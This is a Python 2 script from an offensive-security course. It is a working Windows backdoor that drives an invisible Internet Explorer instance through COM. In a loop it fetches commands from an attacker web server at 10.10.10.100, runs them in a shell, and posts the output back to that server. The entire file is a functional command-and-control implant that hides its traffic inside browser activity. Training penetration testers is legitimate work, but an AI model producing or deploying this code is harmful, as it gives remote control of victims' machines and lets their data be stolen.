# Python For Offensive PenTest: A Complete Practical Course  - All rights reserved 
# Follow me on LinkedIn  https://jo.linkedin.com/in/python2


# Install Python for Windows pywin32-219.win32-py2.7
# http://sourceforge.net/projects/pywin32/files/pywin32/Build%20219/



from win32com.client import Dispatch
from time import sleep
import subprocess



ie = Dispatch("InternetExplorer.Application")  # Create browser instance.
ie.Visible = 0  # Make it invisible [ run in background ] (1= invisible)


# Paramaeters for POST
dURL = "http://10.10.10.100"
Flags = 0
TargetFrame  = ""

while True:

    ie.Navigate("http://10.10.10.100") # Navigate to our kali web server to grab the hacker commands
    
    while ie.ReadyState != 4:    # Wait for browser to finish loading.
        sleep(1)
                

    command = ie.Document.body.innerHTML
    
    command = unicode(command) # Converts HTML entities to unicode.  For example '&amp;'  becomes '&'
    command = command.encode('ascii','ignore')   # encode the command into ASCII string and ignore any exception
    print ' [+] We received command ' + command

    if 'terminate' in command: # if the received command was terminate
        ie.Quit() # quit the IE and end up the process 
        break # end the loop

    else: # if the received command was NOT terminate then we inject the command into a shell and store the result in a variable called Data
        CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

        Data = CMD.stdout.read()
        PostData = buffer( Data ) # in order to submit or post data using COM technique , it requires to  buffer the data first
                                  # https://docs.python.org/2/library/functions.html#buffer
        ie.Navigate( dURL, Flags, TargetFrame, PostData ) # we post the comamnd execution result along with the post parameters which we defined eariler..


    sleep(3)








